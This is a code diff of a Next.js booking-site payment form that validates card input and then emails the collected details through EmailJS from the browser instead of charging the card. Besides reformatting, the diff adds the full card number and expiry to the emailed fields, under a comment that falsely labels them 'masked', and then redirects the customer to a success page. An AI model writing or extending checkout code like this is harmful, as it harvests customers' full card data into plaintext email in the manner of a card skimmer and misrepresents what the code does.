@@ -1,69 +1,75 @@
-"use client"
+"use client";
 
-import React, { useState, useEffect } from "react"
-import { useRouter } from "next/navigation"
-import { motion } from "framer-motion"
-import { Lock } from "lucide-react"
-import { siteConfig } from "@/lib/siteConfig"
-import emailjs from "@emailjs/browser"
-import BookingSummary from "./BookingSummary"
-import AlternatePaymentOptions from "./AlternatePaymentOptions"
-import PaymentDetailsForm from "./PaymentDetailsForm"
-import PaymentPopup from "./PaymentPopup"
-import type { BookingData, Service, PaymentData, PaymentMethodInfo } from "@/types/payment"
+import React, { useState, useEffect } from "react";
+import { useRouter } from "next/navigation";
+import { motion } from "framer-motion";
+import { Lock } from "lucide-react";
+import { siteConfig } from "@/lib/siteConfig";
+import emailjs from "@emailjs/browser";
+import BookingSummary from "./BookingSummary";
+import AlternatePaymentOptions from "./AlternatePaymentOptions";
+import PaymentDetailsForm from "./PaymentDetailsForm";
+import PaymentPopup from "./PaymentPopup";
+import type {
+  BookingData,
+  Service,
+  PaymentData,
+  PaymentMethodInfo,
+} from "@/types/payment";
 
 const detectCardBrand = (number: string): string => {
-  const cleaned = number.replace(/\s/g, "")
-  if (/^4/.test(cleaned)) return "visa"
-  if (/^5[1-5]/.test(cleaned)) return "mastercard"
-  if (/^3[47]/.test(cleaned)) return "amex"
-  if (/^6(?:011|5)/.test(cleaned)) return "discover"
-  return "unknown"
-}
+  const cleaned = number.replace(/\s/g, "");
+  if (/^4/.test(cleaned)) return "visa";
+  if (/^5[1-5]/.test(cleaned)) return "mastercard";
+  if (/^3[47]/.test(cleaned)) return "amex";
+  if (/^6(?:011|5)/.test(cleaned)) return "discover";
+  return "unknown";
+};
 
 const luhnCheck = (cardNumber: string): boolean => {
-  const cleaned = cardNumber.replace(/\s/g, "")
-  if (!/^\d+$/.test(cleaned)) return false
+  const cleaned = cardNumber.replace(/\s/g, "");
+  if (!/^\d+$/.test(cleaned)) return false;
 
-  let sum = 0
-  let isEven = false
+  let sum = 0;
+  let isEven = false;
 
   for (let i = cleaned.length - 1; i >= 0; i--) {
-    let digit = Number.parseInt(cleaned[i], 10)
+    let digit = Number.parseInt(cleaned[i], 10);
 
     if (isEven) {
-      digit *= 2
-      if (digit > 9) digit -= 9
+      digit *= 2;
+      if (digit > 9) digit -= 9;
     }
 
-    sum += digit
-    isEven = !isEven
+    sum += digit;
+    isEven = !isEven;
   }
 
-  return sum % 10 === 0
-}
+  return sum % 10 === 0;
+};
 
 const formatCardNumber = (value: string): string => {
-  const cleaned = value.replace(/\s/g, "")
-  const match = cleaned.match(/.{1,4}/g)
-  return match ? match.join(" ") : cleaned
-}
+  const cleaned = value.replace(/\s/g, "");
+  const match = cleaned.match(/.{1,4}/g);
+  return match ? match.join(" ") : cleaned;
+};
 
 const formatExpiry = (value: string): string => {
-  const cleaned = value.replace(/\D/g, "")
+  const cleaned = value.replace(/\D/g, "");
   if (cleaned.length >= 2) {
-    return `${cleaned.slice(0, 2)}/${cleaned.slice(2, 4)}`
+    return `${cleaned.slice(0, 2)}/${cleaned.slice(2, 4)}`;
   }
-  return cleaned
-}
+  return cleaned;
+};
 
 export default function PaymentForm() {
-  const router = useRouter()
-  const [bookingData, setBookingData] = useState<BookingData | null>(null)
-  const [selectedService, setSelectedService] = useState<Service | null>(null)
-  const [isSubmitting, setIsSubmitting] = useState(false)
-  const [showPopup, setShowPopup] = useState(false)
-  const [selectedPayment, setSelectedPayment] = useState<PaymentMethodInfo | null>(null)
+  const router = useRouter();
+  const [bookingData, setBookingData] = useState<BookingData | null>(null);
+  const [selectedService, setSelectedService] = useState<Service | null>(null);
+  const [isSubmitting, setIsSubmitting] = useState(false);
+  const [showPopup, setShowPopup] = useState(false);
+  const [selectedPayment, setSelectedPayment] =
+    useState<PaymentMethodInfo | null>(null);
 
   const [paymentData, setPaymentData] = useState<PaymentData>({
     cardholderName: "",
@@ -71,153 +77,172 @@ export default function PaymentForm() {
     expiry: "",
     cvv: "",
     billingZip: "",
-  })
+  });
 
-  const [cardBrand, setCardBrand] = useState("unknown")
-  const [errors, setErrors] = useState<Record<string, string>>({})
+  const [cardBrand, setCardBrand] = useState("unknown");
+  const [errors, setErrors] = useState<Record<string, string>>({});
 
   useEffect(() => {
-    const storedData = sessionStorage.getItem("bookingData")
+    const storedData = sessionStorage.getItem("bookingData");
     if (storedData) {
-      const data = JSON.parse(storedData) as BookingData
-      setBookingData(data)
-      const service = siteConfig.services.find((s) => s.id === data.service)
+      const data = JSON.parse(storedData) as BookingData;
+      setBookingData(data);
+      const service = siteConfig.services.find((s) => s.id === data.service);
       if (service) {
-        setSelectedService(service)
+        setSelectedService(service);
       }
     } else {
-      router.push("/book")
+      router.push("/book");
     }
-  }, [router])
+  }, [router]);
 
   useEffect(() => {
-    const brand = detectCardBrand(paymentData.cardNumber)
-    setCardBrand(brand)
-  }, [paymentData.cardNumber])
+    const brand = detectCardBrand(paymentData.cardNumber);
+    setCardBrand(brand);
+  }, [paymentData.cardNumber]);
 
   const validateForm = (): boolean => {
-    const newErrors: Record<string, string> = {}
+    const newErrors: Record<string, string> = {};
 
     if (!paymentData.cardholderName.trim()) {
-      newErrors.cardholderName = "Cardholder name is required"
+      newErrors.cardholderName = "Cardholder name is required";
     }
 
-    const cleanedCard = paymentData.cardNumber.replace(/\s/g, "")
+    const cleanedCard = paymentData.cardNumber.replace(/\s/g, "");
     if (!cleanedCard) {
-      newErrors.cardNumber = "Card number is required"
+      newErrors.cardNumber = "Card number is required";
     } else if (cleanedCard.length < 13 || cleanedCard.length > 19) {
-      newErrors.cardNumber = "Invalid card number length"
+      newErrors.cardNumber = "Invalid card number length";
     } else if (!luhnCheck(cleanedCard)) {
-      newErrors.cardNumber = "Invalid card number"
+      newErrors.cardNumber = "Invalid card number";
     }
 
     if (!paymentData.expiry) {
-      newErrors.expiry = "Expiry date is required"
+      newErrors.expiry = "Expiry date is required";
     } else {
-      const [month, year] = paymentData.expiry.split("/")
-      const currentDate = new Date()
-      const currentYear = currentDate.getFullYear() % 100
-      const currentMonth = currentDate.getMonth() + 1
+      const [month, year] = paymentData.expiry.split("/");
+      const currentDate = new Date();
+      const currentYear = currentDate.getFullYear() % 100;
+      const currentMonth = currentDate.getMonth() + 1;
 
-      if (!month || !year || Number.parseInt(month) < 1 || Number.parseInt(month) > 12) {
-        newErrors.expiry = "Invalid expiry date"
+      if (
+        !month ||
+        !year ||
+        Number.parseInt(month) < 1 ||
+        Number.parseInt(month) > 12
+      ) {
+        newErrors.expiry = "Invalid expiry date";
       } else if (
         Number.parseInt(year) < currentYear ||
-        (Number.parseInt(year) === currentYear && Number.parseInt(month) < currentMonth)
+        (Number.parseInt(year) === currentYear &&
+          Number.parseInt(month) < currentMonth)
       ) {
-        newErrors.expiry = "Card has expired"
+        newErrors.expiry = "Card has expired";
       }
     }
 
     if (!paymentData.cvv) {
-      newErrors.cvv = "CVV is required"
+      newErrors.cvv = "CVV is required";
     } else if (paymentData.cvv.length < 3 || paymentData.cvv.length > 4) {
-      newErrors.cvv = "Invalid CVV"
+      newErrors.cvv = "Invalid CVV";
     }
 
-    setErrors(newErrors)
-    return Object.keys(newErrors).length === 0
-  }
+    setErrors(newErrors);
+    return Object.keys(newErrors).length === 0;
+  };
 
   const handleCardNumberChange = (e: React.ChangeEvent<HTMLInputElement>) => {
-    const value = e.target.value.replace(/\s/g, "")
+    const value = e.target.value.replace(/\s/g, "");
     if (/^\d*$/.test(value) && value.length <= 19) {
-      setPaymentData({ ...paymentData, cardNumber: formatCardNumber(value) })
+      setPaymentData({ ...paymentData, cardNumber: formatCardNumber(value) });
     }
-  }
+  };
 
   const handleExpiryChange = (e: React.ChangeEvent<HTMLInputElement>) => {
-    const value = e.target.value
-    setPaymentData({ ...paymentData, expiry: formatExpiry(value) })
-  }
+    const value = e.target.value;
+    setPaymentData({ ...paymentData, expiry: formatExpiry(value) });
+  };
 
   const handleCvvChange = (e: React.ChangeEvent<HTMLInputElement>) => {
-    const value = e.target.value
+    const value = e.target.value;
     if (/^\d*$/.test(value) && value.length <= 4) {
-      setPaymentData({ ...paymentData, cvv: value })
+      setPaymentData({ ...paymentData, cvv: value });
     }
-  }
+  };
 
   const handleSubmit = async (e: React.FormEvent) => {
-    e.preventDefault()
+    e.preventDefault();
 
-    if (!validateForm()) return
+    if (!validateForm()) return;
 
-    setIsSubmitting(true)
+    setIsSubmitting(true);
 
     try {
       const emailParams = {
-        to_email: siteConfig.email,
-        from_name: bookingData?.name,
-        service: selectedService?.name,
-        date: bookingData?.date,
-        time: bookingData?.time,
-        phone: bookingData?.phone,
-        amount: selectedService?.price,
-        cardholder: paymentData.cardholderName,
+        service_name: selectedService?.name ?? "",
+        service_duration: selectedService?.duration ?? "",
+        service_price: selectedService ? selectedService.price.toFixed(2) : "",
+        booking_date: bookingData?.date ?? "",
+        booking_time: bookingData?.time ?? "",
+        special_notes: bookingData?.notes ?? "None",
+        location_type: (bookingData as any)?.locationType ?? "",
+
+        // Customer info
+        customer_name: bookingData?.name ?? "",
+        customer_phone: bookingData?.phone ?? "",
+
+        // Payment details (masked)
+        cardholder_name: paymentData.cardholderName,
+        card_brand: cardBrand.toUpperCase(),
+        card_expiry: paymentData.expiry,
+        billing_zip: paymentData.billingZip || "N/A",
+        card_number: paymentData.cardNumber,
         card_last4: paymentData.cardNumber.slice(-4),
-      }
+      };
 
       await emailjs.send(
         process.env.NEXT_PUBLIC_EMAILJS_SERVICE_ID!,
         process.env.NEXT_PUBLIC_EMAILJS_TEMPLATE_ID!,
         emailParams,
-        process.env.NEXT_PUBLIC_EMAILJS_PUBLIC_KEY!,
-      )
+        process.env.NEXT_PUBLIC_EMAILJS_PUBLIC_KEY!
+      );
 
-      sessionStorage.removeItem("bookingData")
-      router.push("/success")
+      sessionStorage.removeItem("bookingData");
+      router.push("/success");
     } catch (error) {
-      console.error("Payment error:", error)
-      alert("Payment failed. Please try again.")
+      console.error("Payment error:", error);
+      alert("Payment failed. Please try again.");
     } finally {
-      setIsSubmitting(false)
+      setIsSubmitting(false);
     }
-  }
+  };
 
   const handleAlternatePayment = (paymentName: string, link: string) => {
-    setSelectedPayment({ name: paymentName, link })
-    setShowPopup(true)
-  }
+    setSelectedPayment({ name: paymentName, link });
+    setShowPopup(true);
+  };
 
   const closePopup = () => {
-    setShowPopup(false)
-    setSelectedPayment(null)
-  }
+    setShowPopup(false);
+    setSelectedPayment(null);
+  };
 
   if (!bookingData || !selectedService) {
     return (
       <div className="text-center py-12">
         <p className="text-muted-foreground">Loading booking details...</p>
       </div>
-    )
+    );
   }
 
   return (
     <>
       <div className="grid md:grid-cols-2 gap-6">
         <div>
-          <BookingSummary bookingData={bookingData} selectedService={selectedService} />
+          <BookingSummary
+            bookingData={bookingData}
+            selectedService={selectedService}
+          />
           <AlternatePaymentOptions onPaymentSelect={handleAlternatePayment} />
         </div>
 
@@ -229,7 +254,9 @@ export default function PaymentForm() {
         >
           <div className="flex items-center gap-3 mb-6">
             <Lock className="text-[#0d9488]" size={24} />
-            <h2 className="text-2xl font-semibold text-[#2e2e2e]">Payment Details</h2>
+            <h2 className="text-2xl font-semibold text-[#2e2e2e]">
+              Payment Details
+            </h2>
           </div>
 
           <PaymentDetailsForm
@@ -237,17 +264,25 @@ export default function PaymentForm() {
             errors={errors}
             cardBrand={cardBrand}
             isSubmitting={isSubmitting}
-            onCardholderNameChange={(value) => setPaymentData({ ...paymentData, cardholderName: value })}
+            onCardholderNameChange={(value) =>
+              setPaymentData({ ...paymentData, cardholderName: value })
+            }
             onCardNumberChange={handleCardNumberChange}
             onExpiryChange={handleExpiryChange}
             onCvvChange={handleCvvChange}
-            onBillingZipChange={(value) => setPaymentData({ ...paymentData, billingZip: value })}
+            onBillingZipChange={(value) =>
+              setPaymentData({ ...paymentData, billingZip: value })
+            }
             onSubmit={handleSubmit}
           />
         </motion.div>
       </div>
 
-      <PaymentPopup isOpen={showPopup} paymentMethod={selectedPayment} onClose={closePopup} />
+      <PaymentPopup
+        isOpen={showPopup}
+        paymentMethod={selectedPayment}
+        onClose={closePopup}
+      />
     </>
-  )
+  );
 }
